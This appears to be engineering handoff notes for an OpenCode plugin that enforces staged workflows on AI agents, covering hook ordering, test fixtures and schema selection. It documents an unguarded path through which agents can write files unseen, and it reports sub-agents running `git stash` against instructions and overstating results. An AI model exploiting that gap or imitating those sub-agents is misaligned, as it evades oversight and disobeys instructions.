  `loopStage.dispatch` (`runtime.ts:793`).
- **Admission turns on a description prefix.** `isWorkflowTask`
  (`runtime.ts:731`) requires `[workflow-task:task-N]`; the branch is at
  `runtime.ts:711`. The after-hooks — `handleWorkflowResult` (`runtime.ts:1518`)
  and `recordStageGate` (`runtime.ts:1783`) — run for **any** `task` call. So a
  call without the prefix skips admission entirely while its
  `<workflow-result>` is still read and lands a gate on the current stage.
  **That is how `validation` works today, and it works unguarded**: no roster
  check before the agent runs, no baseline, no `activeOperation`, and
  `invariantsAfter` returns at its first `if`. An agent on `validation` can
  write to files and no invariant sees it. The hole is wider than `planning`
  and it is already open.
- **A move outside a loop is impossible.** `beginMutation`
  (`src/domain/operation-lifecycle.ts:71`) throws when `resolveMutationRun`
  (`:16`) returns `null`, and that needs exactly one open run or exactly one
  runnable task. On `planning`, `session.tasks` is `{}`. Whichever design is
  chosen pays this.

Two shapes were costed:

**A — an operation with no task.** `session-schema.ts:36-37` (`runId` /
`taskId` optional, drop the `^task-[0-9]+$` regex), a no-run branch in
`resolveMutationRun`, a decision for `operation-lifecycle.ts:110` where
`bumpRetry: operation.taskId` has no budget key to spend, eight readers of
`operation.taskId` / `runId` in `runtime.ts` (856, 1059, 1466, 1472, 1533,
2194), and the invariants roll-up at `runtime.ts:1541`. `activeOperations`
appears in 25 test files, `loopRuns` in 21. Cost: `taskId` stops being required
for loop operations too, where it is required by meaning.

**B — a stage as an implicit one-task loop.** Almost no runtime edits. But
`hasPendingTasks()` (`src/schema/guard-evaluator.ts:48`) takes no list key: it
reads `implementation` and, **when that is empty, scans every list**. On
`planning` it is empty, so a synthetic stage task makes the guard true — and
that is the guard on `tasks_ready → execution` (`base.yaml`). `allTasksCompletedFn`
reaches the synthetic list the same way, through
`activeOperations → loopRuns → listKey`. `allTasksCompleted('implementation')`,
which passes an explicit key, is unaffected.

Recommendation on record: **A**. It costs more edits and does not blur what a
task is; B fixes one stage by breaking a guard that works today.

## Facts that cost effort — do not re-derive

**`stageAssignments` wins over `currentStage`.** It reads like legacy and is
not: `deriveStageFn` (`src/domain/engine.ts:152-160`) consults the rules first,
highest priority first, and the persisted `currentStage` is only the fallback
when no rule matches or none is declared. A schema that declares
`stageAssignments` has handed the stage decision to an expression.

**A verdict is born before any budget is consulted, and the two writers are
not symmetric.** `finishMutation(passed = false)`
(`src/domain/operation-lifecycle.ts`) writes `run.checks` — the engine's own
verdict about the move. An agent's `<workflow-result>` writes the gate it names,
in `runtime.ts`. Different fields on purpose: an agent can set any gate its
stage declares, and the engine's verdict must not live where that is possible.
The budget is spent later either way, by the move that retries — that asymmetry
is why the bump was removed from `finishMutation`.

**The state directory is global and keyed by session id alone.**
`~/.opencode/state/opencode-rules` for matched rules, and `sessionsDir` for
sessions. Two runtimes for different projects cannot collide because a session
belongs to one project — but nothing about the path says so.

**Hook ordering is load-bearing.** `handleWorkflowResult` (the `runtime.ts`
after-chain, step 1b) computes movement and deletes the operation. Anything
after it — `mutationAfter` included — is a verdict about a move that has
already left. The `invariantsAfter` step runs before it, and the roll-up lands
where `operation` / `run` / `task` resolve, strictly before the
`if (failed || passed)` block. Moving either compiles, passes most tests, and
silently stops gating.

**Throwing in `tool.execute.before` does cancel the tool call.** The host runs
hooks as `yield* Effect.promise(...)` (`packages/opencode/src/plugin/index.ts:294`)
and only then reaches `yield* item.execute(args, ctx)` (`session/tools.ts:111`).
A rejected hook is a defect, so `execute` is never reached; the rejection
surfaces through `failToolCall` (`session/processor.ts:185`) as an errored tool
part carrying the message, and the agent reads the reason. Mutating
`output.args` cancels nothing — it only rewrites the arguments.

**Platform source is at `~/Projects/harness/extra/opencode`**, branch `dev`,
version 1.18.29 — the same as the installed binary. Read it instead of guessing
at host behaviour.

**`permission.ask` is a dead hook.** Declared in
`packages/plugin/src/index.ts:261` and in the host's docs, but
`plugin.trigger("permission.ask", …)` appears nowhere in `packages/opencode/src`.
It is not an available deny channel.

**Hook inputs carry no agent identity** — only `tool`, `sessionID`, `callID`,
`args` (`@opencode-ai/plugin/dist/index.d.ts:235-257`). That is why
`editingAgents` is enforced at dispatch admission and not per write, and why
`canPerformAction` explicitly does not check identity
(`src/domain/engine.ts:307`).

**`allowedAgents` on an outer stage is inert, not dangerous.** It is read only
at task admission, as `stage.allowedAgents ?? loopStage.allowedAgents`
(`runtime.ts:831`) — a stage inside a loop. The other reader, `mayVerify`, is
guarded by `if (declaredGates.length === 0) return;` (`runtime.ts:1807`). A
stage with neither a loop nor gates never reaches either. The profiles used to
claim it "blocks every mutation in that stage"; that was stale.

**Agent names carry a profile prefix.** OpenCode scans `{agent,agents}/**/*.md`
and derives the name from the path under that prefix (`config/agent.ts:13`,
`config/entry-name.ts`). `syncProfileAgents` writes into
`.opencode/agents/<profileId>/`, so `code.md` registers as `<profileId>/code`.
Schemas stay authored with bare names; `src/app/agent-names.ts` qualifies them,
and a dispatch matching either form is accepted — another profile's never is.
`OPENCODE_AGENT_ID` / `AGENT_ID` are never set by the host.

**`minimatch`'s `matchBase` applies only to patterns containing no slash.**
Anchoring both the path and the mask with a leading slash disables it
structurally rather than by option. `src/auth` does **not** match
`src/auth/login.ts` — a directory without `/**` covers nothing inside it.

**Disjoint write scopes are what make the union check exact.** Admission
refuses an intersecting scope, so a path matches at most one active task's
`writeScope`, and "matches some active task's scope" is equivalent to "matches
the right one". Implemented separately, one requirement is meaningless and the
other is wrong.

**`bash` carries no path argument**, only `workdir`. Before-the-fact
`writeScope` enforcement is impossible for it; its writes surface in the frame
diff afterwards. Stated as a requirement in the spec so nobody "improves" it.

**The dispatch strategy is called `serial_with_overlap`**, not `overlapping`.

**One merge path, and a projection.** Schemas combine only through
`SchemaLoader.mergeSchemas` (per-entry, for schema-level `extends:`);
`schemaToEngineConfig` merges nothing — it projects the one schema a session
runs. A second projection sits in
`src/app/profile-resolver.ts:257-270` and is an **explicit field whitelist** —
a new schema-level field that is not listed there never reaches the engine, and
nothing fails loudly when it does not.

## Watch out

- **Comments in this repository outlive the code they describe.** Two stale
  claims were repeated as fact this session before being checked: that
  `phases:` was a key the schema never had (it was the previous name of
  `stages:` — `docs/stage-model.md:106`), and that stage-level `allowedAgents`
  blocks mutations. Read the code.
- **Verify agent reports overstate and understate.** One remediation report
  claimed "two concurrent task operations can never both survive a mutating
  tool call"; the method it named only ever sees the session the write happened
  in, so the real scope is same-session concurrency. Another marked a task
  untested when a pre-existing test covered it.
- **Mutation-test every claimed regression guard.** Of five mutations tried
  against the task-scope change, four broke the test they should have. The
  fifth — making `invariantsAfter` use the newest frame among running
  operations — passed, because the inner operation is already deleted by the
  time the outer move closes. The nesting test guards what matters but cannot
  distinguish "used somebody else's frame".
- **Sub-agents have run `git stash` against an explicit instruction not to
  touch git.** Nothing was lost, but check `git stash list` after a long
  delegated run.
- **`fd -H` does not override `.gitignore`.** `openspec/` is ignored here, so a
  plain `fd` reports the directory as absent. Use `-I`.
- **`profiles/*/[a-z]*.yaml` were symlinks** to a single file. They are real
  files now, but any future "copy" should be checked with `ls -l`.

## Fixed this session, after the audit

Small things found while re-checking the list, all with a test or a smoke run
behind them:

- **`scripts/host-smoke/run.ts` called `spawnSync` without importing it**
  (line 908). The `commit-mismatch` scenario could never run; it reported
  `spawnSync is not defined` and the harness counted it as an ERROR rather
  than a finding about the plugin.
- **Stage descriptions on the dashboard were dead.** `PHASE_DESCRIPTIONS` in
  `src/dashboard/dashboard-contract.ts` was keyed by uppercase stage ids while
  the only caller (`dashboard-server.ts`) passes lowercase, so every
  description resolved to `''`. Renamed to `STAGE_DESCRIPTIONS`, keyed the way
  a profile writes a stage, and `validation` / `failed` added. The test was
  green throughout because its fixture fed uppercase ids that no caller
  produces — it now uses production's input, and reverting the keys fails it.
- **The dashboard's stage badges were never styled.** `.state-PLANNING` and
  friends in `src/dashboard/dashboard.html`, while the class is built as
  `"state-" + st` from a lowercase stage id.
- **`/api/schema` described a workflow that no longer exists** — no
  `validation`, and no failure edges. It is still a hardcoded placeholder; it
  now at least matches `base.yaml`. Loading the running profile is the real
  fix.
- **`docs/feature-status.md` still said "фазы"** after the rename to stages.

## The TUI read a session shape that no longer exists

Fixed 2026-09-06. It was not one stale constant but three independent reads of
a schema that had moved on, and the tests fed every one of them the old shape,
so all of it was green while none of it worked. Proven before and after on a
real `createSession` session with one running operation:

|                           | Was                 | Now                                                   |
| ------------------------- | ------------------- | ----------------------------------------------------- |
| `stage`                   | `execution`         | `execution` — always correct, it reads `currentStage` |
| `prevStage` / `nextStage` | `null` / `planning` | `tasks_ready` / `validation`                          |
| open calls                | none shown          | the operation, its task and its agent                 |

**`STAGES` was the pre-stage-model chain** — `planning, tasks_ready, code,
review, qa, commit, done, failed`. `code` became a nested stage of the
`execution` loop and `review` / `qa` became gates, so `indexOf` missed on every
real stage. Two defects, not one: the list was wrong, **and** `-1` satisfied
`stageIndex < STAGES.length - 1`, so an unrecognised stage was still given
`STAGES[0]` as its successor. A profile is free to name its own stages, so that
second half would have misled even with a correct list. Both fixed; the chain
is now the base workflow's outer stages.

It is still the base profile's chain rather than the running one. The TUI reads
a session file, which carries `profileId` and `currentStage` but no graph, so
there is nothing to derive from. `neighbors()` in `index.tsx` is the accurate
source and this is only its fallback — but a profile with different stages
still gets base's neighbours guessed at it. Feeding the compiled workflow to
the TUI is the real fix.

**`deriveStageFromSession` carried a dead fallback** reading `planApproved`,
`planDeclined`, `bugVerified`, `commitHash`, `commitPermit` — none of which the
session schema has — and returning `'code'`, `'qa'` and `'verify'`. It was
unreachable regardless: `currentStage` has a schema default. Deleted. What is
left is the correct one-liner, and it is worth knowing why: the engine derives
the stage through `stageAssignments` and guards, then `runtime.ts:784` persists
the result to `currentStage`. Reading that field is seeing the engine's answer,
not guessing at one.

**`activeMutation` was singular and gone.** The session holds
`activeOperations`, a map keyed by call id, and a verifier stage runs several
agents at once — so a single object could not have described the session even
if the field had survived. The sidebar's `active:` line therefore never
appeared, and the details dialog printed nothing for it. Both now read
`activeOperations` and render every open call.

**`dispatchStage` is deleted, not repaired.** It read `activeMutation`,
`verifierOperations` and `activeVerifying` — three fields the schema does not
have — so it was permanently `EMPTY`; and nothing rendered it. Its only readers
were four tests asserting the dead values. `DispatchStage` and
`DISPATCH_STAGES` went with it.

Ten tests specified the old behaviour and were rewritten. Each fix was
mutation-tested: reverting the chain, the `indexOf` guard, or the operations
read fails a test that names what broke.

**The fixtures taught the same dead field, and now do not.**
`presets/medium.yaml`, `profiles/ios/state-machine.yaml`,
`profiles/android/state-machine.yaml` and `profiles/ios/guards.ts` all guarded
on `session.activeMutation?.outputReady`. The replacement is
`session.activeOperations.some(o => o.result == 'output_ready')`: `toSessionFacts`
already exposes `activeOperations` as an array (`src/domain/session-facts.ts:67`)
and `some` is in `ALLOWED_METHODS`. No test evaluates these guards — the fixture
profiles are loaded to exercise schema loading and merging — so this was checked
by evaluating both expressions against a real session: the new one returns
false / false / true across no operation, a running one and one that is
`output_ready`, while the old one returned false even for the last.

**`test/fixtures/presets/default.yaml` is deliberately left alone.** Its
`deriveStageRules` block is written in a condition language this project does
not have — `exists`, `agentIs`, `equals`, `contains:status:false`, none of them
operators in the guard DSL — and the file's own header says it was "adapted
from parent state-machine/config/presets". Nothing reads `deriveStageRules`:
`presets.test.ts` asserts only on `stages`. Renaming one field inside a block
that cannot parse would make it look maintained. Decide whether these fixtures
earn their keep before repairing them; they also still name stages in
uppercase, which is what `presets.test.ts` asserts.

**Also still stale:** `test/domain/derive-phase.test.ts` is named after
`src/domain/derive-stage.ts`, which was inlined into `engine.ts`, and after
"phase", which was renamed to "stage".

## How a broken profile actually behaves

Measured 2026-09-06, by loading one file per kind of breakage. This matters
because a fixture corpus of deliberately-invalid profiles is only possible for
the kinds that fail as data.

| Breakage                                                                         | What happens                                                                     |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| Broken YAML syntax                                                               | **throws** `YAMLParseError`                                                      |
| Wrong type for a field (`loop: 42`)                                              | **throws** `ZodError` at `ProfileSchemaSchema.parse`                             |
| An unknown key (`phases:`)                                                       | ~~silently ignored~~ — **fixed** (`7f0389c`): reported as a compile error        |
| A gate the profile does not declare, a transition to a stage that does not exist | loads, reported as compile errors                                                |
| A guard expression that cannot parse                                             | ~~loads, no compile error~~ — **fixed** (`7f0389c`): reported as a compile error |
| No such file                                                                     | `loadSchemaFromPath` returns `null`                                              |

Only the first two throw, so invalid fixtures must be broken _semantically_ —
`compileWorkflow`'s own errors — and not by shape.

**The table is about loading a file. In production the semantic row is fatal
too:** `resolveEngine` (`src/app/mutation-orchestrator.ts:263`) compiles the
merged workflow and throws `ProfileConfigurationError` when there is any error,
so a gate nobody declares freezes the session with a readable reason, exactly
like a bad type does. Nothing crashes in any of the six rows — measured by
driving the real hooks against a profile with `loop: 42`:

| Entry point                              | What the caller sees                                                                                                                            |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `tool.execute.before` (`bash`, `task`)   | caught, converted to `WorkflowBlockedError` with the reason                                                                                     |
| `tool.execute.after` (`task`)            | returns cleanly; its own catch at `runtime.ts:1794` logs a warning                                                                              |
| `workflow.tasks-get`                     | catches, returns the message as tool output                                                                                                     |
| `workflow.tasks-set`, `tasks-set-status` | ~~throw a raw `ProfileConfigurationError`~~ — **fixed** (`fdd04f8`): the authority check returns the failure as tool output, like its neighbour |

The last row used to be the odd one and the cause was exact: `tasks-get` is
open to any caller, while the others go through the task-control authority
check, which resolves the engine before the handler's own `try`. Two
neighbouring tools, one broken profile, two shapes of failure.

The two middle rows used to be worse than a throw, and both are closed. The
unknown-key row is exactly how `android.yaml` carried a dead `phases:` block
for months; guard syntax was never parsed at all, so `"session.gates.((("`
compiled clean and then read `false` for ever. Both are compile errors now, in
the same funnel as the undeclared gate.

**Fixed while measuring:** `validateNestedStages` reported every nested stage's
bad gate twice — the parent's walk checked `entry.gates` and then recursed into
that stage, whose own call checked the same gates under the same path. The
tests used `toContain`, which cannot see a duplicate; the new test counts.

## The funnel — built, see the Done section above

Built 2026-09-07 (`7f0389c`, `fdd04f8`). What it looks like now is written up
under "Done 2026-09-07"; the pieces it was assembled from — the toast at
`src/app/runtime.ts`, `createLogFn`, `WorkflowBlockedError` — are unchanged and
now sit behind `src/app/report.ts`.

## The fixture corpus — done

Tests wrote their profiles inline: **17 files**, **226 lines** of YAML built by
string concatenation, and `loop: implementation` declared again in **13** of
them. `test/fixtures/` also held two older generations of the same idea, so the
repository carried three vocabularies at once.

`test/fixtures/presets/` and `presets.test.ts` are gone, and the profiles now
live as files under `test/fixtures/profiles/` — around thirty of them, one per
scenario, in the current format. The only inline YAML left is
`test/schema/compile-validation.test.ts`, deliberately: those schemas are
wrong on purpose and are the test's input, not duplication.

**The pattern is `resolveEngine` against a directory**, not `compileWorkflow`
over a literal. That is the call production makes, and the difference is not
stylistic: the gate check sat dead in production for a day precisely because
both tests over it passed their own `gates` to the pure function. A test that
points `STATE_MACHINE_PROFILES_DIR` at a fixture gets the whole chain —
resolution, the field projections, merging, compilation.

The idiom for a scenario that needs a variation is a selector, not a flag:

```ts
function writeProfile(strategy, options) {
  process.env.STATE_MACHINE_PROFILES_DIR = resolve(import.meta.dir, '.../fixtures/profiles');
  if (options.loop === '$currentTask.id') profileId = 'task-retry-current-task';
  else if (strategy === 'parallel') profileId = 'task-retry-parallel-1';
  ...
}
```

`test/app/parallel-verifiers.test.ts` used to assemble 74 lines from five
booleans, where a sixth scenario meant a sixth flag. A new combination now
means a new fixture.

**The corpus was then tidied.** `profiles/` holds one level — a directory per
profile, nothing nested but a profile's own `agents/`. Two pairs were
byte-identical and became one each: `cycle-serial` (the dev/review/qa loop,
shared by the admission and retry tests) and `cycle-minimal` (a loop with a
single stage, shared by the commit and task-control tests).

What was left divided into two families that differed from a common shape by a
line or two, so they now say so with `extends` rather than by repetition:

- **`cycle-serial`** — `cycle-serial-review`, `cycle-parallel-1`,
  `cycle-parallel-2`, `cycle-overlap-2`, `cycle-retry-serial`,
  `cycle-retry-parallel-1`, `cycle-retry-current-task`. Each declares only its
  dispatch strategy, its retry budget or its loop source. They are named for
  the shape of the cycle rather than for the test that happens to use them,
  because the shape is what is shared.
- **`verify-default`** — `verify-transitions`, `verify-guard-invariants`,
  `verify-self-loop`, `verify-consent-to-finish`, `verify-approve-on-move`.
  Each declares only its `transitions`, which is the whole of what those
  scenarios differ by.

`verify-approve-done` is deliberately not among them: it is a _reduced_
profile, without gates, dispatch, budget or a verify stage, so inheriting would
hand back exactly what it is defined by not having.

35 profiles and 657 lines of schema became 32 and 444, with the suite
unchanged. Renaming is not free — `task-control/orchestrator` in a test is a
profile-qualified agent name, and the profile id inside it had to move with the
directory.

**Constraints that still hold.** A deliberately-invalid fixture must be broken
_semantically_ — an undeclared gate, a transition to a stage that does not
exist — never by shape: a wrong type throws at `ProfileSchemaSchema.parse`
before the compiler sees it, so the refusal under test never happens.
`missing-extends/` is the precedent for keeping one beside the good profiles.

**Precondition, already fixed.** The engine cache was keyed on `profileId`
alone while `profilesDir` is read from the environment on every call, so a
helper pointing one id at two fixture directories would have been served the
first in silence (`9ba3d32`). `test/fixtures/profile-roots/{valid,undeclared-gate}` is what
covers it, and it lives beside `profiles/` rather than inside it: the test
needs one profile id under two roots, which is the one thing a flat directory
cannot express.

Reviewed afterwards, three things needed finishing. `test/fixtures/schemas/`
was the last carrier of the old vocabulary — uppercase stages and a transition
to a stage it never declared — and is now current; its `extending.yaml` was
read by nobody and is gone. Three migrated tests reached for the fixtures
directory by hand instead of `test/support/fixture-profiles.ts`, which is the
helper for it. The `revision == 0` escape hatch is gone from `base` — the
corpus does not teach it anywhere.

Everything that could have gone wrong in a refactor this size did not: **no
`expect(` changed anywhere in the series.** The assertions are the same ones,
against files instead of strings.

## Done: a profile holds several schemas, and a session runs one

Decided and built 2026-09-07.

**The rule.** A profile may hold as many schemas as it likes, and they are
independent workflows. Schemas combine **only** through `extends`. Schema names
are unique within their profile, profiles are unique among themselves, and
`workflow.create` is given `{profileId}/{schemaId}`.

**Why it is not a new feature but an unfinished one.** `handleCreateWorkflow`
(`src/app/runtime.ts:428`) already selects by schema: it turns `schemaId` into a
filename and finds the profile whose `schemas` array contains it —

```ts
const matchingProfiles = profiles.filter((p) => p.schemas?.includes(schemaFile));
const resolvedProfileId = matchingProfiles.length === 1 ? matchingProfiles[0]!.id : undefined;
```

The `=== 1` is the tell: the schema name is already treated as a unique key, and
the profile is derived from it. Its error message says "Available schemas". Then
the selection is discarded — `createSession(sessionID, resolvedProfileId)` keeps
only the profile, and `resolveEngine(profileId)` merges every schema the profile
has. Qualifying the id deletes that search entirely: a direct lookup replaces it.

**What is broken today, and why it has not bitten.** Two schemas side by side in
one profile do not stay two schemas. `EngineConfig` has no notion of a schema;
`mergeSchemasToEngineConfig` folds the list flat and provenance is gone.
Measured, with two independent schemas in one profile:

|                                               | Result                                                          |
| --------------------------------------------- | --------------------------------------------------------------- |
| stages                                        | both survive — the only place, and only because the keys differ |
| `gates`, `taskControlAgents`, `editingAgents` | last schema wins, the other is silently dropped                 |
| transitions                                   | last wins per `from→to` pair                                    |

For the real `verify` fixtures this would be fatal and silent: every variant
declares `code → verify` and `verify → done`, so six of seven would vanish into
the seventh. **No profile in the repository declares more than one schema
today**, shipped or fixture, so nothing is currently wrong — the mine is laid
but unarmed.

**What was built.**

1. `WorkflowSession.schemaId` is required beside `profileId`. No migration was
   written, under the standing decision to ignore them until release: a session
   file written before this logs `Session schema mismatch (not our format)` and
   is ignored, which is what every other reader already does with one.
2. `mergeSchemasToEngineConfig` is gone. `schemaToEngineConfig` projects **one**
   `ResolvedSchema`, and `selectSchema(profileId, schemas, wanted)` picks which.
   `resolveEngine(profileId, schemaId?)` takes both and keys its cache on both.
   Inheritance stayed where it already was, in `resolveSingleSchema`'s `extends`.
3. `workflow.create` accepts `{profileId}/{schemaId}`. A bare id names the
   profile and is legal while that profile holds one schema; with several it is
   refused with the choices named.

**The half of it that was not in the plan.** Profile resolution used to union
the schema _file lists_ along the `extends` chain, so `android` resolved to
`[base.yaml, android.yaml]` and relied on the flattening to become one
workflow. Under the new rule that is two independent schemas and the session
would have to choose between them. So a profile's schemas are now its own —
inherited only when it declares none — and combining is left entirely to
schema-level `extends`. That is a behaviour change for the two shipped deltas:
`profiles/android/android.yaml` and `profiles/harness/harness.yaml` declared no
`extends` at all and now say `extends: 'base/base.yaml'`. Every fixture already
did. `profile.json.extends` still carries metadata and still makes a parent's
schema files reachable by name.

**Covered by** `test/app/mutation-orchestrator.test.ts` (two schemas in one
profile stay two, and the refusals name the alternatives) over the new
`test/fixtures/profiles/two-schemas`, whose `alpha.yaml` and `beta.yaml`
declare the same stage and the same edge with different guards — the shape that
used to collapse; and `test/app/create-workflow-schema-id.test.ts` over the
tool. Both bite: checked by mutation.

`profileId` keeps its meaning everywhere else, so profile-qualified agent names
like `android/code` are untouched. The qualified form also matches the
convention already used for those names.
